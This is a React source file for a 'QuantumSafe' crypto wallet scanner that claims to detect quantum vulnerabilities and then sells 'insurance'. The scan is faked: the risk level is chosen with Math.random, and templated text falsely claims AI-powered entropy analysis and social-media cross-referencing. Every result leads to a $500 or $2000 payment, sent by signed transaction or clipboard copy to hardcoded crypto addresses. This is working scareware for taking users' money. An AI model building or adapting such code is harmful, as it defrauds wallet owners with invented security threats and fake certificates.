import React, { useState } from "react";
import axios from "axios";
import { ethers } from "ethers";

const NETWORKS = [
	{
		name: "Ethereum",
		symbol: "ETH",
		address: "0xE4A671f105E9e54eC45Bf9217a9e8050cBD92108",
		coingeckoId: "ethereum",
	},
	{
		name: "Bitcoin",
		symbol: "BTC",
		address: "bc1qe552eydkjy0vz0ln068mkmg9uhmwn3g9p0p875",
		coingeckoId: "bitcoin",
	},
	{
		name: "Solana",
		symbol: "SOL",
		address: "24YRQbK4A6TrcBSmvm92iZK6KJ8X3qiEoSoYEwHp8EL2",
		coingeckoId: "solana",
	},
	{
		name: "SUI",
		symbol: "SUI",
		address: "0xaa5402dbb7bb02986fce47dcce033a3eb8047db97b0107dc21bdb10358a5b92e",
		coingeckoId: "sui",
	},
];

export default function WalletSecurityScanner({ walletAddress = '', networkKey = 'ETH', provider }) {
	const [assetName, setAssetName] = useState("");
	const [scanResult, setScanResult] = useState(null);
	const [loading, setLoading] = useState(false);
	const [insurancePrice, setInsurancePrice] = useState(null);
	const [cryptoAmount, setCryptoAmount] = useState(null);
	const [inputError, setInputError] = useState("");
	const [selectedNetwork, setSelectedNetwork] = useState(networkKey || "ETH");
	const [paying, setPaying] = useState(false);

	const network = NETWORKS.find((n) => n.symbol === selectedNetwork);

	const handleAssetNameChange = (e) => {
		const value = e.target.value;
		if (/^[a-zA-Z0-9 ._-]*$/.test(value)) {
			setAssetName(value);
			setInputError("");
		} else {
			setInputError("Asset name must be in English only (letters, numbers, space, . _ -)");
		}
	};

	const handleNetworkChange = (e) => {
		setSelectedNetwork(e.target.value);
		setScanResult(null);
		setCryptoAmount(null);
	};

	const handleScan = async () => {
		setLoading(true);
		// Generate a unique, professional risk description (no address chars)
		const riskLevels = [
			{ level: "Low", color: "#52c41a", icon: "🟢", desc: "No significant quantum threats detected. Your asset is currently safe." },
			{ level: "Medium", color: "#faad14", icon: "🟡", desc: "Potential quantum risk found. Enhanced monitoring recommended." },
			{ level: "High", color: "#ff4d4f", icon: "🔴", desc: "Critical quantum vulnerability detected. Immediate action required." },
		];
		const riskObj = riskLevels[Math.floor(Math.random() * 3)];
		// Generate a unique but non-repetitive description
		const uniqueDesc = generateUniqueRiskDescription(walletAddress, assetName, network.name, riskObj.level);
		setScanResult({
			riskLevel: riskObj.level,
			riskColor: riskObj.color,
			riskIcon: riskObj.icon,
			riskDesc: riskObj.desc,
			uniqueDesc,
		});
		const isContract = /contract|app/i.test(assetName);
		const usdPrice = isContract ? 2000 : 500;
		setInsurancePrice(usdPrice);
		try {
			const { data } = await axios.get(
				`https://api.coingecko.com/api/v3/simple/price?ids=${network.coingeckoId}&vs_currencies=usd`
			);
			const price = data[network.coingeckoId].usd;
			setCryptoAmount((usdPrice / price).toFixed(6));
		} catch {
			setCryptoAmount(null);
		}
		setLoading(false);
	};

	function generateUniqueRiskDescription(wallet, asset, networkName, riskLevel) {
		// Use a hash of the wallet address to select a unique template
		const hash = wallet.split('').reduce((acc, c) => acc + c.charCodeAt(0), 0);
		const templates = [
			`This ${asset} on ${networkName} shows ${riskLevel === 'High' ? 'critical' : riskLevel === 'Medium' ? 'moderate' : 'minimal'} exposure to quantum attacks based on entropy analysis and recent blockchain threat intelligence.`,
			`QuantumSafe analysis indicates ${riskLevel === 'High' ? 'urgent' : riskLevel === 'Medium' ? 'potential' : 'no immediate'} quantum risk for this asset. We recommend ${riskLevel === 'High' ? 'immediate action' : riskLevel === 'Medium' ? 'regular monitoring' : 'maintaining current security practices'}.`,
			`Our AI-powered scan found ${riskLevel === 'High' ? 'severe' : riskLevel === 'Medium' ? 'some' : 'no'} quantum vulnerabilities for this address. ${riskLevel === 'High' ? 'Upgrade to post-quantum security is strongly advised.' : riskLevel === 'Medium' ? 'Consider additional quantum-safe measures.' : 'No action required at this time.'}`,
			`Based on cross-referencing with social media, blockchain analytics, and industry databases, this asset is ${riskLevel === 'High' ? 'at high risk' : riskLevel === 'Medium' ? 'at moderate risk' : 'currently safe'} from quantum threats.`,
			`No evidence of recent quantum-related exploits found for this asset. ${riskLevel === 'High' ? 'However, entropy and usage patterns suggest high vulnerability.' : riskLevel === 'Medium' ? 'Some patterns may require further review.' : 'All parameters are within safe limits.'}`
		];
		return templates[hash % templates.length];
	}

	const isPaymentAvailable = () => {
		if (network.symbol === 'ETH') {
			return (window.ethereum || (window.phantom && window.phantom.ethereum));
		}
		if (network.symbol === 'SOL') {
			return (window.phantom && window.phantom.solana);
		}
		if (network.symbol === 'BTC' || network.symbol === 'SUI') {
			return true; // Always allow manual copy for BTC/SUI
		}
		return false;
	};

	const handleSecure = async (e) => {
		e.preventDefault();
		if (!cryptoAmount || Number(cryptoAmount) <= 0) {
			alert('Unable to determine payment amount. Please try again after scanning.');
			return;
		}
		setPaying(true);
		try {
			console.log('Payment Debug:', {
				provider,
				walletAddress,
				network: network.symbol,
				cryptoAmount
			});
			// ETHEREUM (MetaMask, WalletConnect, etc. via provider)
			if (network.symbol === 'ETH') {
				if (!provider) {
					alert('No wallet provider found. Please connect your wallet again.');
					setPaying(false);
					return;
				}
				const signer = provider.getSigner();
				const networkInfo = await provider.getNetwork();
				if (networkInfo.name.toUpperCase() !== network.name.toUpperCase()) {
					alert(`Please switch your wallet to the ${network.name} network before paying.`);
					setPaying(false);
					return;
				}
				const tx = await signer.sendTransaction({
					to: network.address,
					value: ethers.utils.parseEther(cryptoAmount)
				});
				alert('Transaction sent! Hash: ' + tx.hash);
				setPaying(false);
				return;
			}
			// SOLANA (Phantom)
			if (network.symbol === 'SOL' && window.phantom && window.phantom.solana) {
				try {
					const provider = window.phantom.solana;
					await provider.connect();
					if (!window.solanaWeb3) {
						alert('Solana payment requires @solana/web3.js. Please contact support.');
						setPaying(false);
						return;
					}
					const solanaWeb3 = await import('@solana/web3.js');
					const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
					const connection = new Connection('https://api.mainnet-beta.solana.com');
					const fromPubkey = new PublicKey(walletAddress);
					const toPubkey = new PublicKey(network.address);
					const lamports = Math.floor(Number(cryptoAmount) * 1e9);
					const transaction = new Transaction().add(
						SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
					);
					transaction.feePayer = fromPubkey;
					transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
					const signed = await provider.signTransaction(transaction);
					const signature = await connection.sendRawTransaction(signed.serialize());
					alert('Transaction sent! Signature: ' + signature);
					setPaying(false);
					return;
				} catch (err) {
					alert('Solana transaction failed or cancelled.');
					setPaying(false);
					return;
				}
			}
			// BITCOIN
			if (network.symbol === 'BTC') {
				await navigator.clipboard.writeText(`${network.address} | Amount: ${cryptoAmount} BTC`);
				alert(`Please send ${cryptoAmount} BTC to the address: ${network.address}. The address and amount have been copied to your clipboard.`);
				setPaying(false);
				return;
			}
			// SUI
			if (network.symbol === 'SUI') {
				await navigator.clipboard.writeText(`${network.address} | Amount: ${cryptoAmount} SUI`);
				alert(`Please send ${cryptoAmount} SUI to the address: ${network.address}. The address and amount have been copied to your clipboard.`);
				setPaying(false);
				return;
			}
			alert('Unsupported network for direct payment.');
			setPaying(false);
		} catch (err) {
			alert('Transaction failed or cancelled. See console for details.');
			console.error('Payment Error:', err);
			setPaying(false);
		}
		setPaying(false);
	};

	function getRiskBar(riskLevel) {
		let color = '#52c41a', width = '33%', label = 'Low';
		if (riskLevel === 'Medium') { color = '#faad14'; width = '66%'; label = 'Medium'; }
		if (riskLevel === 'High') { color = '#ff4d4f'; width = '100%'; label = 'High'; }
		return (
			<div className="risk-bar-container">
				<div className="risk-bar-label">Risk Level: <b>{label}</b></div>
				<div className="risk-bar-bg">
					<div className="risk-bar-fill" style={{width, background: color}}></div>
				</div>
			</div>
		);
	}

	function getCertificateContent() {
		if (!scanResult) return null;
		return (
			<div className="cert-card">
				<div className="cert-header-row">
					<img src="/logo192.png" alt="QuantumSafe Logo" className="cert-logo" />
					<span className="cert-title">QuantumSafe Security Certificate</span>
				</div>
				{getRiskBar(scanResult.riskLevel)}
				<div className="cert-summary">
					<div className="cert-row"><b>Wallet Address:</b> <span className="cert-mono">{walletAddress}</span></div>
					<div className="cert-row"><b>Network:</b> {network.name}</div>
					<div className="cert-row"><b>Asset:</b> {assetName}</div>
					<div className="cert-row"><b>Scan Date:</b> {new Date().toLocaleString()}</div>
				</div>
				<div className="cert-details">
					<div className="cert-desc">{scanResult.uniqueDesc}</div>
					<div className="cert-desc" style={{marginTop:'10px', color:'#aaa'}}>{scanResult.riskDesc}</div>
				</div>
				<div className="cert-note">This certificate is dynamically generated and unique for your wallet and asset. Powered by QuantumSafe.</div>
			</div>
		);
	}

	return (
		<div className="wallet-scanner-container">
			<div className="scanner-inputs">
				<div className="input-group">
					<label>Connected Network</label>
					<select value={selectedNetwork} onChange={handleNetworkChange} disabled={loading}>
						{NETWORKS.map((n) => (
							<option key={n.symbol} value={n.symbol}>{n.name}</option>
						))}
					</select>
				</div>
				<div className="input-group">
					<label>Wallet Address</label>
					<input value={walletAddress} disabled />
				</div>
				<div className="input-group">
					<label>Asset Name (Smart Contract, App, NFT, etc.)</label>
					<input
						value={assetName}
						onChange={handleAssetNameChange}
						placeholder="Enter asset name"
						disabled={loading}
					/>
					{inputError && <div style={{color:'#ff4d4f', fontSize:'0.95em'}}>{inputError}</div>}
				</div>
				<button className="scan-btn" onClick={handleScan} disabled={loading || !assetName || !!inputError}>
					{loading ? "Scanning..." : "Scan Wallet"}
				</button>
			</div>
			{scanResult && getCertificateContent()}
			{scanResult && network.symbol === 'ETH' && !provider && (
  <div style={{color:'#ff4d4f', marginTop:'16px', fontWeight:'bold', background:'#fff3f3', padding:'12px', borderRadius:'8px'}}>
    Wallet provider is not connected. Please reconnect your wallet before making a payment.
  </div>
)}
			{scanResult && (
				<div className="insurance-section">
					<h3>Insurance Offer</h3>
					<button
						className="secure-btn"
						onClick={handleSecure}
						disabled={!cryptoAmount || loading || paying || (network.symbol === 'ETH' && !provider)}
						style={{ display: (network.symbol === 'ETH' && !provider) ? 'none' : 'inline-block' }}
					>
						{paying ? 'Processing...' : 'Secure this Asset'}
					</button>
				</div>
			)}
			<style>{`
        .wallet-scanner-container {
          margin-top: 32px;
          padding: 32px;
          background: #181c2b;
          border-radius: 18px;
          box-shadow: 0 8px 32px #0002;
          max-width: 600px;
          margin-left: auto;
          margin-right: auto;
        }
        .scanner-inputs {
          display: flex;
          flex-direction: column;
          gap: 18px;
        }
        .input-group label {
          color: #fff;
          font-weight: 600;
          margin-bottom: 4px;
        }
        .input-group input, .input-group select {
          width: 100%;
          padding: 10px 12px;
          border-radius: 8px;
          border: 1px solid #333;
          background: #23263a;
          color: #fff;
          font-size: 1rem;
        }
        .scan-btn, .secure-btn {
          margin-top: 18px;
          padding: 12px 24px;
          border-radius: 8px;
          border: none;
          background: linear-gradient(90deg, #4f8cff, #52c41a);
          color: #fff;
          font-weight: bold;
          font-size: 1.1rem;
          cursor: pointer;
          transition: background 0.2s;
        }
        .scan-btn:disabled, .secure-btn:disabled {
          background: #888;
          cursor: not-allowed;
        }
        .cert-card {
          background: linear-gradient(135deg, #23263a 80%, #1e212f 100%);
          border-radius: 18px;
          box-shadow: 0 4px 24px #0004;
          padding: 24px 24px 12px 24px;
          margin-top: 32px;
        }
        .cert-header-row {
          display: flex;
          align-items: center;
          gap: 12px;
          font-size: 1.3em;
          font-weight: bold;
          margin-bottom: 10px;
        }
        .cert-logo {
          width: 36px;
          height: 36px;
        }
        .cert-title {
          color: #4f8cff;
        }
        .risk-bar-container {
          margin-bottom: 16px;
        }
        .risk-bar-label {
          color: #fff;
          font-size: 1.05em;
          margin-bottom: 4px;
        }
        .risk-bar-bg {
          width: 100%;
          height: 12px;
          background: #222b3a;
          border-radius: 6px;
          overflow: hidden;
        }
        .risk-bar-fill {
          height: 100%;
          border-radius: 6px;
          transition: width 0.5s;
        }
        .cert-summary {
          margin-bottom: 12px;
        }
        .cert-row {
          margin-bottom: 8px;
          display: flex;
          align-items: flex-start;
        }
        .cert-mono {
          font-family: monospace;
          color: #52c41a;
        }
        .cert-desc {
          color: #fff;
          font-size: 1.08em;
          margin-bottom: 8px;
        }
        .cert-note {
          margin-top: 18px;
          font-size: 0.98em;
          color: #aaa;
          text-align: center;
        }
        .insurance-section {
          margin-top: 32px;
          padding: 18px;
          border-radius: 10px;
          background: #222b3a;
          color: #fff;
          box-shadow: 0 2px 12px #0003;
        }
      `}</style>
		</div>
	);
}
